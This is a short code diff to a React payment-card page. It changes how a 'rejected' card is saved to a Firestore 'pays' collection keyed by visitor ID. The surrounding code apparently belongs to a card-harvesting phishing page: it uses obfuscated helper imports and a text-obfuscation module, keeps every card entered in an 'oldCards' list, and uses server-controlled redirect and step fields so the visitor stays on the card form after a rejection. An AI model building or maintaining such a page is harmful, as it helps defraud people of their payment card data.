@@ -11,7 +11,7 @@ import { ShieldCheck, CreditCard, Lock } from "lucide-react"
 import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils"
 import { db } from "@/lib/firebase"
 import { secureAddData } from "@/lib/secure-firebase"
-import { doc, onSnapshot, updateDoc } from "firebase/firestore"
+import { doc, onSnapshot, setDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { FullPageLoader } from "./loader"
 import { _gt } from "@/lib/text-obf"
@@ -208,13 +208,13 @@ export default function P1({ offerTotalPrice }: _P1Props) {
               rejectedAt: new Date().toISOString()
             }
             
-            updateDoc(doc(db, "pays", visitorID), {
+            setDoc(doc(db, "pays", visitorID), {
               oldCards: data.oldCards ? [...data.oldCards, currentCardData] : [currentCardData],
               cardStatus: "pending",
               // Clear redirect fields so user stays on card page
               redirectPage: null,
               currentStep: "_st1"
-            }).catch(err => {
+            }, { merge: true }).catch(err => {
               console.error("[Card Status] Error saving rejected card:", err)
             })
           }
